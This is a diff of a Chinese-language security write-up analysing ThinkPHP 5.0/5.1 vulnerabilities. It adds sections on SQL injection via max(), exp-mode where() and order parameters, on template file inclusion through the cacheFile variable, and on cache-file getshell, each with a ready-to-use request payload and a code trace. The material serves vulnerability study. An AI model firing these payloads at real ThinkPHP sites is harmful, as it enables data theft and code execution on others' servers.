@@ -152,7 +152,9 @@ ThinkPHP5.0版本默认的变量修饰符是`/s`,如果需要传入字符串之�
 
 >如果你要获取的数据为数组,请一定注意要加上`/a`修饰符才能正确获取到
 
-# 5.0.14版本sql注入
+# parseData导致sql注入(inc)
+
+>测试版本为5.0.14
 
 [ThinkPHP 5.0.14](http://www.thinkphp.cn/download/1107.html)
 
@@ -369,7 +371,9 @@ INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204072029966.png)
 
-# 5.1.6版本sql注入
+# parseArrayData导致sql注入(point)
+
+>测试版本为5.1.6
 
 ## 漏洞复现
 
@@ -501,7 +505,9 @@ INSERT INTO `users` (`username`) VALUES ('b' and updatexml(1,concat(0x7e,user(),
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101427972.png)
 
-# 5.0.10版本sql注入
+# parseWhereItem导致sql注入(not like)
+
+>测试版本为5.0.10
 
 ## 漏洞复现
 
@@ -702,7 +708,9 @@ SELECT * FROM `users` WHERE  (`username` NOT LIKE 'asdf' ) UNION SELECT 1,USER()
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102043480.png)
 
-# 5.1.17版本sql注入
+# parseKey导致sql注入(parseOrder)
+
+>测试版本为5.1.17
 
 ## 漏洞复现
 
@@ -721,7 +729,9 @@ class Index
 }
 ```
 
-`?order[id` and updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1`
+```
+?order[id` and updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1
+```
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102145690.png)
 
@@ -848,3 +858,612 @@ SELECT * FROM `users` WHERE `username` = 'user' ORDER BY `id` and updatexml(1,co
 ```
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102225852.png)
+
+# parseKey导致sql注入(max查询)
+
+>测试版本为5.1.25
+
+## 漏洞复现
+
+```php
+<?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $options = request()->get('options');
+        $result = db('users')->max($options);
+        var_dump($result);
+    }
+}
+```
+
+```
+?options=id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users%23
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111454161.png)
+
+## 漏洞分析
+
+函数调用栈
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111504332.png)
+
+```php
+#thinkphp/library/think/db/Query.php
+    /**
+     * MAX查询
+     * @access public
+     * @param  string $field    字段名
+     * @param  bool   $force    强制转为数字类型
+     * @return mixed
+     */
+    public function max($field, $force = true)
+    {
+        return $this->aggregate('MAX', $field, $force);
+    }
+    /**
+     * 聚合查询
+     * @access public
+     * @param  string $aggregate    聚合方法
+     * @param  string $field        字段名
+     * @param  bool   $force        强制转为数字类型
+     * @return mixed
+     */
+    public function aggregate($aggregate, $field, $force = false)
+    {
+        $this->parseOptions();
+
+        $result = $this->connection->aggregate($this, $aggregate, $field);
+
+        ...
+
+        return $result;
+    }
+
+#thinkphp/library/think/db/Connection.php
+    /**
+     * 得到某个字段的值
+     * @access public
+     * @param  Query     $query     查询对象
+     * @param  string    $aggregate 聚合方法
+     * @param  string    $field     字段名
+     * @return mixed
+     */
+    public function aggregate(Query $query, $aggregate, $field)
+    {
+        $field = $aggregate . '(' . $this->builder->parseKey($query, $field, true) . ') AS tp_' . strtolower($aggregate);
+        #$field=MAX(`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`) AS tp_max
+        return $this->value($query, $field, 0);#执行查询并得到某个字段的值
+    }
+
+#thinkphp/library/think/db/builder/Mysql.php
+    /**
+     * 字段和表名处理
+     * @access public
+     * @param  Query     $query 查询对象
+     * @param  mixed     $key   字段名
+     * @param  bool      $strict   严格检测
+     * @return string
+     */
+    public function parseKey(Query $query, $key, $strict = false)#$key=id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#
+    {
+        if (is_numeric($key)) {
+            return $key;
+        } elseif ($key instanceof Expression) {
+            return $key->getValue();
+        }
+
+        ...
+
+        if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
+            $key = '`' . $key . '`';
+        }
+
+        return $key;#$key=`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`
+    }
+```
+
+从`Query->max`传递到`Query->aggregate`再传递到`Connection->aggregate`,通过`parseKey`对传入的`$options`进行处理
+
+>类似于前面提到的5.1.17版本sql注入
+
+处理后得到
+
+```
+$key=`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`
+```
+
+返回到`Connection->aggregate`,`$field`进行拼接得到
+
+```
+$field=MAX(`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`) AS tp_max
+```
+
+最终进行查询的sql为
+
+```
+SELECT MAX(`id`)and updatexml(1,concat(0x7e,version(),0x7e),1) from users#`) AS tp_max FROM `users` LIMIT 1  
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111512808.png)
+
+# exp注入(全版本影响)
+
+>测试版本为5.0.10
+
+## 漏洞复现
+
+```php
+<?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()->get('username');
+        $result = db('users')->where('username','exp',$username)->select();
+        var_dump($result);
+    }
+}
+```
+
+```
+?username==1) and updatexml(1,concat(0x7e,user(),0x7e),1)%23
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204111736580.png)
+
+## 漏洞分析
+
+```php
+#thinkphp/library/think/db/Query.php
+    /**
+     * 指定AND查询条件
+     * @access public
+     * @param mixed $field     查询字段
+     * @param mixed $op        查询表达式
+     * @param mixed $condition 查询条件
+     * @return $this
+     */
+    public function where($field, $op = null, $condition = null)
+    {
+        $param = func_get_args();
+        array_shift($param);
+        #$param
+        #0 = {} "exp"
+        #1 = {} "=1) and updatexml(1,concat(0x7e,user(),0x7e),1)#"
+        $this->parseWhereExp('AND', $field, $op, $condition, $param);
+        return $this;
+    }
+
+    /**
+     * 分析查询表达式
+     * @access public
+     * @param string                $logic     查询逻辑 and or xor
+     * @param string|array|\Closure $field     查询字段
+     * @param mixed                 $op        查询表达式
+     * @param mixed                 $condition 查询条件
+     * @param array                 $param     查询参数
+     * @return void
+     */
+    protected function parseWhereExp($logic, $field, $op, $condition, $param = [])
+    {
+        #$condition = {} "=1) and updatexml(1,concat(0x7e,user(),0x7e),1)#"
+        #$field = {} "username"
+        #$logic = {} "AND"
+        #$op = {} "exp"
+        #$param = {数组} [2]
+        # 0 = {} "exp"
+        # 1 = {} "=1) and updatexml(1,concat(0x7e,user(),0x7e),1)#"
+        $logic = strtoupper($logic);
+
+        ...
+
+        if (is_string($field) && preg_match('/[,=\>\<\'\"\(\s]/', $field)) {
+            ...
+        } else {
+            $where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];
+            if ('exp' == strtolower($op) && isset($param[2]) && is_array($param[2])) {#$param[2]没有设置,因此不用进行参数绑定
+                // 参数绑定
+                $this->bind($param[2]);
+            }
+            // 记录一个字段多次查询条件
+            $this->options['multi'][$logic][$field][] = $where[$field];#用户输入的参数没有经过过滤便赋值到$this->options中
+        }
+        if (!empty($where)) {
+            if (!isset($this->options['where'][$logic])) {
+                $this->options['where'][$logic] = [];
+            }
+            ...
+            $this->options['where'][$logic] = array_merge($this->options['where'][$logic], $where);
+        }
+    }
+
+#thinkphp/library/think/db/Builder.php
+    // where子单元分析
+    protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
+    {
+        $whereStr = '';
+        if (in_array($exp, ['=', '<>', '>', '>=', '<', '<='])) {
+            ...
+        } elseif ('EXP' == $exp) {
+            // 表达式查询
+            $whereStr .= '( ' . $key . ' ' . $value . ' )';
+        }
+        return $whereStr;
+    }
+```
+
+在`parseWhereItem`中完成`$this->options`拼接,并执行sql语句,最终执行的语句为
+
+```
+SELECT * FROM `users` WHERE  ( `username` =1) and updatexml(1,concat(0x7e,user(),0x7e),1)# ) 
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112020497.png)
+
+# 模板引擎文件包含漏洞
+
+>测试版本为5.0.14
+
+## 漏洞复现
+
+```php
+<?php
+namespace app\index\controller;
+use think\Controller;
+class Index extends Controller
+{
+    public function index()
+    {
+        $a=request()->get();
+        $this->assign($a);
+        return $this->fetch();
+    }
+}
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112215561.png)
+
+添加`application/index/view/index/index.html`并随便写入一点内容
+
+向`pulibc/upload/a.jpg`添加一个图片马,模拟文件上传
+
+目录结构
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112218378.png)
+
+`?cacheFile=upload/a.jpg`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112218376.png)
+
+## 漏洞分析
+
+函数调用栈
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112227721.png)
+
+```php
+#thinkphp/library/think/Controller.php
+    /**
+     * 模板变量赋值
+     * @access protected
+     * @param  mixed $name  要显示的模板变量
+     * @param  mixed $value 变量的值
+     * @return $this
+     */
+    protected function assign($name, $value = '')#$name => $a['cacheFile']="upload/a.jpg"
+    {
+        $this->view->assign($name, $value);
+
+        return $this;
+    }
+
+#thinkphp/library/think/View.php
+    /**
+     * 模板变量赋值
+     * @access public
+     * @param mixed $name  变量名
+     * @param mixed $value 变量值
+     * @return $this
+     */
+    public function assign($name, $value = '')
+    {
+        if (is_array($name)) {
+            $this->data = array_merge($this->data, $name);#$this->data['cacheFile']="upload/a.jpg"
+        } else {
+            $this->data[$name] = $value;
+        }
+        return $this;
+    }
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204112236292.png)
+
+```php
+#thinkphp/library/think/Controller.php
+    /**
+     * 加载模板输出
+     * @access protected
+     * @param  string $template 模板文件名
+     * @param  array  $vars     模板输出变量
+     * @param  array  $replace  模板替换
+     * @param  array  $config   模板参数
+     * @return mixed
+     */
+    protected function fetch($template = '', $vars = [], $replace = [], $config = [])
+    {
+        return $this->view->fetch($template, $vars, $replace, $config);
+    }
+
+#thinkphp/library/think/View.php
+    /**
+     * 解析和获取模板内容 用于输出
+     * @param string    $template 模板文件名或者内容
+     * @param array     $vars     模板输出变量
+     * @param array     $replace 替换内容
+     * @param array     $config     模板参数
+     * @param bool      $renderContent     是否渲染内容
+     * @return string
+     * @throws Exception
+     */
+    public function fetch($template = '', $vars = [], $replace = [], $config = [], $renderContent = false)
+    {
+        // 模板变量
+        $vars = array_merge(self::$var, $this->data, $vars);#$vars['cacheFile']="upload/a.jpg"
+
+        ...
+
+        // 渲染输出
+        try {
+            $method = $renderContent ? 'display' : 'fetch';
+            // 允许用户自定义模板的字符串替换
+            $replace = array_merge($this->replace, $replace, $this->engine->config('tpl_replace_string'));
+            $this->engine->config('tpl_replace_string', $replace);
+            $this->engine->$method($template, $vars, $config);#关键点
+        } catch (\Exception $e) {
+            ob_end_clean();
+            throw $e;
+        }
+        ...
+        return $content;
+    }
+
+#thinkphp/library/think/view/driver/Think.php
+    /**
+     * 渲染模板文件
+     * @access public
+     * @param string    $template 模板文件
+     * @param array     $data 模板变量
+     * @param array     $config 模板参数
+     * @return void
+     */
+    public function fetch($template, $data = [], $config = [])
+    {
+        if ('' == pathinfo($template, PATHINFO_EXTENSION)) {
+            // 获取模板文件名
+            $template = $this->parseTemplate($template);
+        }
+        // 模板不存在 抛出异常
+        if (!is_file($template)) {
+            throw new TemplateNotFoundException('template not exists:' . $template, $template);
+        }
+        // 记录视图信息
+        App::$debug && Log::record('[ VIEW ] ' . $template . ' [ ' . var_export(array_keys($data), true) . ' ]', 'info');
+        $this->template->fetch($template, $data, $config);#$data['cacheFile']="upload/a.jpg"
+    }
+
+#thinkphp/library/think/Template.php
+    /**
+     * 渲染模板文件
+     * @access public
+     * @param string    $template 模板文件
+     * @param array     $vars 模板变量
+     * @param array     $config 模板参数
+     * @return void
+     */
+    public function fetch($template, $vars = [], $config = [])
+    {
+        if ($vars) {
+            $this->data = $vars;
+        }
+        ...
+        $template = $this->parseTemplateFile($template);
+        if ($template) {
+            $cacheFile = $this->config['cache_path'] . $this->config['cache_prefix'] . md5($this->config['layout_name'] . $template) . '.' . ltrim($this->config['cache_suffix'], '.');
+            ...
+            // 读取编译存储
+            $this->storage->read($cacheFile, $this->data);#关键点
+            #$this->data['cacheFile']="upload/a.jpg"
+            // 获取并清空缓存
+            $content = ob_get_clean();
+            if (!empty($this->config['cache_id']) && $this->config['display_cache']) {
+                // 缓存页面输出
+                Cache::set($this->config['cache_id'], $content, $this->config['cache_time']);
+            }
+            echo $content;
+        }
+    }
+
+#thinkphp/library/think/template/driver/File.php
+    /**
+     * 读取编译编译
+     * @param string  $cacheFile 缓存的文件名
+     * @param array   $vars 变量数组
+     * @return void
+     */
+    public function read($cacheFile, $vars = [])
+    {
+        if (!empty($vars) && is_array($vars)) {
+            // 模板阵列变量分解成为独立变量
+            extract($vars, EXTR_OVERWRITE);
+        }
+        //载入模版缓存文件
+        include $cacheFile;#完成文件包含
+    }
+```
+
+用户输入没有被过滤通过`assign`方法保存到`$this->data`中,通过调用`fetch`方法加载模板输出,最终在`read`方法中进行文件包含
+
+# 缓存getshell
+
+[利用Thinkphp 5缓存漏洞实现前台Getshell](https://www.cnblogs.com/h2zZhou/p/7824723.html)
+
+>测试版本为5.0.10
+
+## 漏洞复现
+
+>运行目录要修改到`/`而不是`/public`
+
+```php
+<?php
+namespace app\index\controller;
+use think\Cache;
+class Index
+{
+    public function index()
+    {
+        $username=input("get.username");
+        Cache::set("name",$username);
+        return 'Cache success';
+    }
+}
+```
+
+`?username=asdf%0aphpinfo();//`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204132018118.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204132020702.png)
+
+>跟thinkphpv3的缓存getshell类似
+
+## 漏洞分析
+
+函数调用栈
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204132032009.png)
+
+```php
+#thinkphp/library/think/Cache.php
+    /**
+     * 自动初始化缓存
+     * @access public
+     * @param array         $options  配置数组
+     * @return Driver
+     */
+    public static function init(array $options = [])
+    {
+        if (is_null(self::$handler)) {
+            // 自动初始化缓存
+            if (!empty($options)) {
+                $connect = self::connect($options);
+            } elseif ('complex' == Config::get('cache.type')) {
+                $connect = self::connect(Config::get('cache.default'));
+            } else {
+                $connect = self::connect(Config::get('cache'));
+            }
+/*
+    // +----------------------------------------------------------------------
+    // | 缓存设置
+    // +----------------------------------------------------------------------
+
+    'cache'                  => [
+        // 驱动方式
+        'type'   => 'File',
+        // 缓存保存目录
+        'path'   => CACHE_PATH,
+        // 缓存前缀
+        'prefix' => '',
+        // 缓存有效期 0表示永久缓存
+        'expire' => 0,
+    ],
+*/
+            self::$handler = $connect;
+        }
+        return self::$handler;
+    }
+    /**
+     * 写入缓存
+     * @access public
+     * @param string        $name 缓存标识
+     * @param mixed         $value  存储数据
+     * @param int|null      $expire  有效时间 0为永久
+     * @return boolean
+     */
+    public static function set($name, $value, $expire = null)#$name="name",$vuale=用户输入值
+    {
+        self::$writeTimes++;
+        return self::init()->set($name, $value, $expire);
+    }
+
+#thinkphp/library/think/cache/driver/File.php
+    /**
+     * 写入缓存
+     * @access public
+     * @param string    $name 缓存变量名
+     * @param mixed     $value  存储数据
+     * @param int       $expire  有效时间 0为永久
+     * @return boolean
+     */
+    public function set($name, $value, $expire = null)#$name="name",$vuale=用户输入值
+    {
+        if (is_null($expire)) {
+            $expire = $this->options['expire'];
+        }
+        $filename = $this->getCacheKey($name);#生成文件名,$filename=b0/68931cc450442b63f5b3d276ea4297.php
+        if ($this->tag && !is_file($filename)) {
+            $first = true;
+        }
+        $data = serialize($value);#序列化数据,利用换行符逃逸,跟thinkphpv3一样
+        if ($this->options['data_compress'] && function_exists('gzcompress')) {#数据压缩默认关闭
+            //数据压缩
+            $data = gzcompress($data, 3);
+        }
+        $data   = "<?php\n//" . sprintf('%012d', $expire) . $data . "\n?>";
+        $result = file_put_contents($filename, $data);#写入文件
+        if ($result) {
+            isset($first) && $this->setTagItem($filename);
+            clearstatcache();
+            return true;
+        } else {
+            return false;
+        }
+    }
+    /**
+     * 取得变量的存储文件名
+     * @access protected
+     * @param string $name 缓存变量名
+     * @return string
+     */
+    protected function getCacheKey($name)
+    {
+        $name = md5($name);#md5("name")=b068931cc450442b63f5b3d276ea4297
+        if ($this->options['cache_subdir']) {
+            // 使用子目录
+            $name = substr($name, 0, 2) . DS . substr($name, 2);#$name=b0/68931cc450442b63f5b3d276ea4297
+        }
+        if ($this->options['prefix']) {
+            $name = $this->options['prefix'] . DS . $name;
+        }
+        $filename = $this->options['path'] . $name . '.php';
+        $dir      = dirname($filename);
+        if (!is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+        return $filename;#b0/68931cc450442b63f5b3d276ea4297.php
+    }
+```
+
+1. thinkphp推荐的运行目录是`/public`
+
+2. 需要知道键名才能确定webshell的路径
+
+3. 没有设置`$this->options['prefix']`
+
+#
